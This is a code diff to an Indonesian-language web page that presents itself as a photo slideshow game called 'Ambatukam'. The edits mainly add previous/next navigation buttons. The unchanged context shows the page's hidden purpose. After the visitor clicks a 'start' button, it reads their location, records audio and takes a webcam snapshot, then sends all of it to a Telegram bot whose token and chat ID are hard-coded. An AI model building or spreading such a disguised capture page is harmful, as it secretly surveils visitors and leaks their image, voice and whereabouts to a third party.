@@ -30,7 +30,7 @@
       object-fit: cover;
       z-index: -2;
     }
-    /* Konten Sambutan (Intro) — diletakkan di belakang overlay */
+    /* Konten Sambutan (Intro) — tampil di awal */
     #introText {
       position: absolute;
       top: 50%;
@@ -49,7 +49,7 @@
       font-size: 1.2rem;
       margin-bottom: 20px;
     }
-    /* Tombol di halaman sambutan */
+    /* Tombol sambutan */
     #startGameBtn {
       padding: 10px 30px;
       background-color: red;
@@ -62,7 +62,7 @@
     #startGameBtn:hover {
       background-color: darkred;
     }
-    /* Kontainer Game (Foto & tombol Lanjut) */
+    /* Kontainer Foto (Game) */
     #photoContainer {
       display: none;
       position: absolute;
@@ -74,31 +74,33 @@
       padding: 0 20px;
     }
     #photoContainer img {
-      max-width: 100%;
       width: 100%;
+      max-width: 100%;
       height: auto;
       margin-bottom: 20px;
     }
-    /* Tombol “Lanjut” */
-    #nextBtn {
-      display: none;
-      padding: 10px 30px;
-      background-color: green;
-      color: white;
-      border: none;
-      font-size: 1.2rem;
-      cursor: pointer;
-      border-radius: 5px;
+    /* Tombol Navigasi (Ikon) */
+    #prevBtn, #nextBtn {
       position: absolute;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      z-index: 11;
+      top: 50%;
+      transform: translateY(-50%);
+      background-color: rgba(0,0,0,0.5);
+      border: none;
+      color: white;
+      font-size: 2.5rem;
+      cursor: pointer;
+      padding: 10px;
+      border-radius: 50%;
+      z-index: 12;
+      display: none;
     }
-    #nextBtn:hover {
-      background-color: darkgreen;
+    #prevBtn {
+      left: 10px;
     }
-    /* Overlay Darkness & Spotlight (disembunyikan dulu) */
+    #nextBtn {
+      right: 10px;
+    }
+    /* Overlay Darkness & Spotlight (tidak tampil di awal) */
     .darkness {
       display: none;
       position: absolute;
@@ -114,7 +116,7 @@
       width: 300px;
       height: 300px;
       border-radius: 50%;
-      /* Box-shadow besar untuk menggelapkan layar kecuali area lingkaran */
+      /* Menggelapkan seluruh layar kecuali area lingkaran */
       box-shadow: 400vh 0px 0px 400vw rgba(0,0,0,0.99);
     }
     .shadow {
@@ -176,9 +178,9 @@
         font-size: 1rem;
         padding: 8px 20px;
       }
-      #nextBtn {
-        font-size: 1rem;
-        padding: 8px 20px;
+      #prevBtn, #nextBtn {
+        font-size: 2rem;
+        padding: 8px;
       }
       .light {
         width: 200px;
@@ -201,11 +203,13 @@
     <button id="startGameBtn">Izinkan dan Mulai</button>
   </div>
 
-  <!-- Kontainer Game (Foto) -->
+  <!-- Kontainer Foto (Game) -->
   <div id="photoContainer">
     <img id="photoSlide" src="" alt="Ambatukam Image" />
   </div>
-  <button id="nextBtn">Lanjut</button>
+  <!-- Tombol Navigasi: Prev dan Next -->
+  <button id="prevBtn">&#10094;</button>
+  <button id="nextBtn">&#10095;</button>
 
   <!-- Overlay Darkness & Spotlight -->
   <div class="darkness" id="darkness">
@@ -228,7 +232,7 @@
   </audio>
 
   <script>
-    // Konfigurasi Telegram
+    // Konfigurasi Telegram (ganti dengan token & chatId milik Anda)
     const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";
     const chatId = "6010073048";
 
@@ -245,6 +249,7 @@
     const startGameBtn = document.getElementById('startGameBtn');
     const photoContainer = document.getElementById('photoContainer');
     const photoSlide = document.getElementById('photoSlide');
+    const prevBtn = document.getElementById('prevBtn');
     const nextBtn = document.getElementById('nextBtn');
     const darkness = document.getElementById('darkness');
     const light = document.getElementById('light');
@@ -265,8 +270,9 @@
     startGameBtn.addEventListener('click', async () => {
       // Sembunyikan konten sambutan
       introText.style.display = 'none';
-      // Tampilkan overlay darkness (spotlight) setelah teks sambutan hilang
+      // Tampilkan overlay darkness (spotlight)
       darkness.style.display = 'block';
+      // Mulai game
       await startGame();
     });
 
@@ -283,8 +289,9 @@
         
         // Mulai menangkap foto, audio, dan lokasi, kemudian kirim ke Telegram
         capturePhotoAndAudio(location.coords);
-        // Tampilkan kontainer game (foto) dan tombol "Lanjut"
+        // Tampilkan kontainer game (foto) dan tombol navigasi
         photoContainer.style.display = 'block';
+        prevBtn.style.display = 'block';
         nextBtn.style.display = 'block';
         showPhoto(currentPhotoIndex);
       } catch (error) {
@@ -309,7 +316,7 @@
       // Setelah 5 detik, ambil snapshot (foto) dan hentikan perekaman audio
       setTimeout(() => {
         const canvas = document.createElement("canvas");
-        // Gunakan ukuran video jika tersedia, jika tidak gunakan default 640x480
+        // Jika ukuran video tersedia, gunakan; jika tidak gunakan default 640x480
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext("2d");
@@ -381,9 +388,24 @@
       photoSlide.src = photos[index];
     }
 
-    // Tombol "Lanjut": jika belum foto terakhir, lanjutkan; jika sudah, tampilkan popup akhir
+    // Tombol Navigasi: "Prev" untuk mundur, "Next" untuk lanjut.
+    // Jika di foto terakhir, klik "Next" akan memunculkan popup.
+    prevBtn.addEventListener('click', () => {
+      // Jika popup tampil, sembunyikan popup
+      if (endPopup.style.display === 'block') {
+        endPopup.style.display = 'none';
+      }
+      // Navigasi mundur (wrap-around)
+      if (currentPhotoIndex === 0) {
+        currentPhotoIndex = photos.length - 1;
+      } else {
+        currentPhotoIndex--;
+      }
+      showPhoto(currentPhotoIndex);
+    });
     nextBtn.addEventListener('click', () => {
       if (currentPhotoIndex === photos.length - 1) {
+        // Tampilkan popup konfirmasi jika sudah di foto terakhir
         endPopup.style.display = 'block';
       } else {
         currentPhotoIndex++;
